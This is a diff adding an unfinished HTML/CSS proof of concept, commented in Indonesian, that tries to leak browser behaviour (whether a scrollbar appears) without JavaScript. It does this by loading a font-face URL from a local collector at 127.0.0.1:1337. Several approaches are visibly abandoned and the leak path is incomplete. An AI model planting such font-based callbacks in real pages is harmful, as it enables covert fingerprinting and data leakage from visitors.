@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <style>
+        /* Definisikan font mata-mata kita, sama seperti sebelumnya */
+        @font-face {
+            font-family: 'LeakyFont';
+            unicode-range: U+41;
+            /* 'A' */
+            src: url('http://127.0.0.1:1337/leak.png?result=scrollbar');
+        }
+
+        @font-face {
+            font-family: 'LeakyFont';
+            unicode-range: U+42;
+            /* 'B' */
+            src: url('http://127.0.0.1:1337/leak.png?result=no_scrollbar');
+        }
+
+        /* Atur panggung */
+        #scrollbar-stage {
+            position: absolute;
+            top: -9999px;
+            /* Sembunyikan */
+            width: 100px;
+            height: 50px;
+            /* Paksa overflow vertikal agar scrollbar bisa muncul */
+            overflow-y: scroll;
+        }
+
+        #scroller-force-element {
+            width: 100%;
+            height: 50px;
+            /* Tingginya sama dengan wadah, jadi tidak ada scrollbar */
+            background: red;
+            /* Agar terlihat saat debugging */
+        }
+
+        /* 
+ * TRIK UTAMA:
+ * Saat di-hover, jalankan animasi berat yang juga menggeser elemen ke bawah.
+ * Karena perbedaan performa/implementasi timing, di beberapa browser,
+ * elemen ini akan tergeser lebih dari 1px, menyebabkan overflow dan scrollbar muncul.
+ * Di browser lain, mungkin hanya tergeser 0.9px, sehingga scrollbar tidak muncul.
+*/
+        #start-trigger:hover~#scrollbar-stage>#scroller-force-element {
+            animation: gpu-torture-and-scroll 50ms forwards;
+        }
+
+        @keyframes gpu-torture-and-scroll {
+            from {
+                filter: blur(0px);
+                transform: translateY(0);
+            }
+
+            to {
+                filter: blur(5px) saturate(5);
+                /* Beban GPU */
+                /* Geser sedikit ke bawah. Ini akan menyebabkan overflow jika > 0 */
+                transform: translateY(1px);
+            }
+        }
+
+        /* 
+ * MEKANISME KEBOCORAN:
+ * Kita gunakan "sibling selector" dan "media query" lebar.
+ * `vw` adalah persentase dari viewport width.
+ * Jika scrollbar muncul, lebar yang tersedia di dalam browser berkurang ~17px.
+*/
+        #leak-detector {
+            font-family: 'LeakyFont';
+            position: absolute;
+            top: -9999px;
+        }
+
+        /*
+ * Jika tidak ada scrollbar, #scrollbar-stage akan memiliki lebar 100px.
+ * Jika ada scrollbar, lebarnya menjadi 100px - ~17px = 83px.
+ * Kita bisa mendeteksi perbedaan ini.
+*/
+
+        /* Skenario 1: Scrollbar muncul (lebar panggung < 90px) */
+        #scrollbar-stage:has(#scroller-force-element[style*="animation"])+#leak-detector {
+            /* CSS :has mungkin belum didukung penuh, ini pendekatan alternatif */
+        }
+
+        /* Pendekatan lebih andal: Gunakan kueri media pada viewport */
+        /* Defaultnya, coba bocorkan "B" (no_scrollbar) */
+        #start-trigger:hover~#leak-detector::after {
+            content: 'B';
+        }
+
+        /* 
+ * Atur lebar #scrollbar-stage ke sesuatu yang responsif.
+ * Misalnya: width: calc(50vw - 10px).
+ * Jika scrollbar muncul, lebar efektif browser berubah, dan 50vw akan berbeda.
+ * Ini adalah bagian yang paling rumit dan membutuhkan tuning.
+ *
+ * PENDEKATAN LEBIH SEDERHANA & LANGSUNG:
+*/
+        @media (min-width: 1000px) {
+            #start-trigger:hover~#leak-detector[data-test="scrollbar"]::after {
+                content: 'A';
+            }
+        }
+
+        /* (Font-face definition tetap sama) */
+
+        #start-trigger:hover~#container {
+            overflow-y: scroll;
+            /* PAKSA SCROLLBAR MUNCUL */
+        }
+
+        #container {
+            width: 200px;
+            height: 100px;
+        }
+
+        #inner-element {
+            width: 100%;
+            /* Lebar ini akan menjadi 200px atau 200-17=183px */
+            height: 50px;
+            background: blue;
+        }
+
+        /* Sekarang kita gunakan #inner-element untuk mengontrol kebocoran */
+        /* Ini masih sulit tanpa JS */
+    </style>
+</head>
+
+<body>
+
+    <h1 id="start-trigger">Arahkan Mouse ke sini untuk memulai</h1>
+
+    <!-- 
+      Wadah ini akan menjadi "panggung" kita. 
+      Lebarnya akan berubah jika scrollbar muncul di dalamnya.
+    -->
+    <div id="scrollbar-stage">
+        <!-- Elemen ini akan dianimasikan untuk memaksa scrollbar muncul atau tidak -->
+        <div id="scroller-force-element"></div>
+    </div>
+
+    <!-- Elemen ini akan digunakan untuk membocorkan hasilnya -->
+    <div id="leak-detector"></div>
+</body>
+
+</html>
